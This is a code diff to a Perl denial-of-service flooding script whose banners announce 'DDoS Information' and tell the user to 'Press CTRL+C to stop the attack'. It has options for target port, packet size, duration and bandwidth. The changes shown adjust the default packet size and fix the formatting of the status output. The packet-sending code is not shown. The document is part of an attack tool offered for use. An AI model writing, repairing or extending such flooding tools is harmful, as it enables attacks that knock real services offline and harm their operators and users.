@@ -4,7 +4,7 @@ use Getopt::Long;
 use Time::HiRes qw( usleep gettimeofday ) ;
 
 our $port = 80;
-our $size = 5000;
+our $size = 0;
 our $time = 0;
 our $bw   = 0;
 our $help = 0;
@@ -48,13 +48,13 @@ printf "[0;32m>> Made by DeriVer  \n";
 printf "[0;31m>> hitting the ip    \n";
 printf "[0;36m>> hitting the ports     \n";
 ($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
-printf "-------------------------------------------";
-printf "-=-=-         DDoS Information        -=-=-";
+print "------------------------------------------- \n";
+print "-=-=-         DDoS Information        -=-=- \n";
 printf "Interpacket delay $delay msec\n" if $delay;
 printf "total IP bandwidth $bw kbps\n" if $bw;
-printf "Size used : $size";
-printf "Time used : $time";
-printf "Port used : $port";
+print "Size used : $size \n";
+print "Time used : $time \n";
+print "Port used : $port \n";
 printf "[1;31m>> Press CTRL+C to stop the attack  \n" unless $time;
 
 die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
